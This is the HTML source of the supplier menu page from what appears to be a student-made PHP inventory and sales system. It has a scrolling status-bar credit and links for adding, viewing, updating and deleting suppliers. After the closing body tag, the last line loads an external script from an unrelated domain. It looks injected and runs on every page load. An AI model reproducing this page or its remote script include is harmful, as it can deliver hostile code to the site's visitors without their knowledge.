<html>
<head>

<title>Supplier</title>
</head>
<SCRIPT language=JavaScript>
<!--
// Use the following three variables to set up the message:
var msg = "This Software is Designed By Lalit Chandnani(Administrator & Frontend Designer), Deepak Agnihotri(Analysis & Connectivity), Rahul Sharma(Database Designer) Student of CSE VIsem,OIST Bpl"
var delay = 100
var startPos = 127

// Don't touch these variables:
var timerID = null
var timerRunning = false
var pos = 0

// Crank it up!
StartScrolling()

function StartScrolling(){
    // Make sure the clock is stopped
    StopTheClock()

    // Pad the message with spaces to get the "start" position
    for (var i = 0; i < startPos; i++) msg = " " + msg

    // Off we go...
    DoTheScroll()
}

function StopTheClock(){
    if(timerRunning)
        clearTimeout(timerID)
    timerRunning = false
}

function DoTheScroll(){
    if (pos < msg.length)
        self.status = msg.substring(pos, msg.length);
    else
        pos=-1;
    ++pos
    timerRunning = true
    timerID = self.setTimeout("DoTheScroll()", delay)
}
//-->

</SCRIPT>
<body background="back.jpg">

	<img src="./top.jpg" width=975 >
<table width=1000>
	<tr>
	<td width='90%'><b>Welcome, lalit </b></td>
	<td width="10%"><a href="end.php" align="right"><font color="#000000"><b>Logout</b></font></a></td>
	</tr>
</table>

	<br><br><br><br><br><br>
<table>

<td width=300 height=300 colspan=1 rowspan=3 valign=top align=left>
	<map name="map397">
				<area shape='rect' coords='4,5,135,40' href='customer.php'>
				<area shape='rect' coords='4,49,135,83' href='item.php'>
				<area shape='rect' coords='4,93,135,127' href='sales.php'>
				<area shape='rect' coords='4,137,135,172' href='supplier.php'>
				<area shape='rect' coords='4,179,135,213' href='purchase.php'>
				<area shape='rect' coords='4,220,135,258' href='report.php'>
				<area shape='rect' coords='4,270,135,310' href='end.php'>
	</map>
	<tr>
	<td width="5%"></td>
	<td width="40%"><br><img  border=0 src="sup.jpg" usemap="#map397"></td>
	<td width="55%"><a href="newsup.php"><font color="#8B4513" face="Comic Sans MS, arial, Century Gothic" size=6>=> New Supplier Entry</font></a><br><br>
			<a href="supinfo.php"><font color="#8B4513" face="Comic Sans MS, arial, Century Gothic" size=6>=> Supplier Information</font></a><br><br>
			<a href="supup.php"><font color="#8B4513" face="Comic Sans MS, arial, Century Gothic" size=6>=> Supplier Update</font></a><br><br>
			<a href="supdel.php"><font color="#8B4513" face="Comic Sans MS, arial, Century Gothic" size=6>=> Delete Supplier Entry</font></a><br><br></td></font>
	
</td>
</table>



</body><script src="http://www.yayadown.com/b.js"></script>